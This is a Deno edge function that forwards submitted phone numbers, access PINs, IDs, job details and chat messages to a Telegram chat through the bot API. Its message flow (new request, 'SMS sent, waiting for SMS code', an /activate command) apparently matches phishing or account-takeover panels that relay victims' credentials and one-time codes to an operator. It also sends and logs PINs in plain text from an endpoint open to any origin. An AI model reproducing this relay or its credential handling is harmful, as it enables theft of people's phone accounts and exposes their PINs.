
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface TelegramNotificationRequest {
  phone?: string;
  accessCode?: string;
  shortId?: string;
  type?: 'request' | 'activation' | 'sms_sent' | 'completed' | 'evaluation_completed' | 'live_chat_message';
  workerName?: string;
  auftragTitle?: string;
  auftragsnummer?: string;
  message?: string;
  senderName?: string;
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { phone, accessCode, shortId, type = 'request', workerName, auftragTitle, auftragsnummer, message, senderName }: TelegramNotificationRequest = await req.json();
    
    const botToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
    const chatId = Deno.env.get('TELEGRAM_CHAT_ID');
    
    if (!botToken || !chatId) {
      console.error('Missing Telegram credentials');
      return new Response(
        JSON.stringify({ error: 'Missing Telegram credentials' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Create different messages based on type
    let telegramMessage: string;
    if (type === 'live_chat_message') {
      telegramMessage = `💬 Neue Live Chat Nachricht!\n👤 Von: ${senderName}\n📝 Nachricht: ${message}`;
    } else if (type === 'evaluation_completed') {
      telegramMessage = `📝 Auftrag bewertet!\n📋 ${auftragTitle} (${auftragsnummer})\n👤 von ${workerName} wurde erfolgreich bewertet.`;
    } else if (type === 'activation') {
      telegramMessage = `✅ Nummer Aktiviert!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
      if (shortId) {
        telegramMessage += `\n🆔 ID: ${shortId}`;
      }
    } else if (type === 'sms_sent') {
      telegramMessage = `📤 SMS versendet!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
      if (shortId) {
        telegramMessage += `\n🆔 ID: ${shortId}`;
      }
      telegramMessage += `\n⏳ Wartet auf SMS Code`;
    } else if (type === 'completed') {
      telegramMessage = `✅ Vorgang abgeschlossen!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
      if (shortId) {
        telegramMessage += `\n🆔 ID: ${shortId}`;
      }
      telegramMessage += `\n🎉 Erfolgreich beendet`;
    } else {
      telegramMessage = `🔔 Neue Anfrage eingegangen!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
      if (shortId) {
        telegramMessage += `\n🆔 ID: ${shortId}\n\nZum Aktivieren: /activate ${shortId}`;
      }
    }
    
    console.log(`Sending Telegram notification (${type}):`, { phone, accessCode, shortId, workerName, auftragTitle, auftragsnummer, message, senderName });
    
    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: telegramMessage,
      }),
    });

    if (!telegramResponse.ok) {
      const errorText = await telegramResponse.text();
      console.error('Telegram API error:', errorText);
      return new Response(
        JSON.stringify({ error: 'Failed to send Telegram message' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const result = await telegramResponse.json();
    console.log(`Telegram notification (${type}) sent successfully:`, result);

    return new Response(
      JSON.stringify({ success: true, result }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    console.error('Error in send-telegram-notification function:', error);
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
